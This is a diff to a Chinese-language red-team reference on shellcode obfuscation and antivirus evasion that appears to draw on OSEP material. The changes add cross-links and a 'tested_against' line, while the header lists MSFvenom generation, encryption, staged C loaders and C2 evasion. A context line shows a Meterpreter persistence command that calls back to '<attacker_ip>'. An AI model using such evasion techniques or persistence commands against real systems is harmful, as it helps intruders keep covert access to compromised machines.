@@ -1,7 +1,10 @@
 # Shellcode 混淆与免杀实战参考
+- MSFvenom Payload 生成 → `tools-msf.md`
+- Linux 提权维持访问 → `post-linux-privesc.md`
 
 > 覆盖: MSF生成 → 编码混淆 → 加密 → 分段加载 → C语言加载器 → C2规避
 
+> **last_updated**: 2026-06-04 | **tested_against**: MSFvenom 6.x, SysWhys3, Hell's Gate, AES-256
 ---
 
 ## 1. MSFvenom 生成
@@ -381,5 +384,8 @@ run persistence -U -i 60 -p 4444 -r <attacker_ip>
 ```
 
 ---
+## 相关参考
+- MSFvenom Payload 生成 → `tools-msf.md`
+- Linux 提权维持访问 → `post-linux-privesc.md`
 
 *参考: MSFvenom + Donut + OSEP + 实战经验*
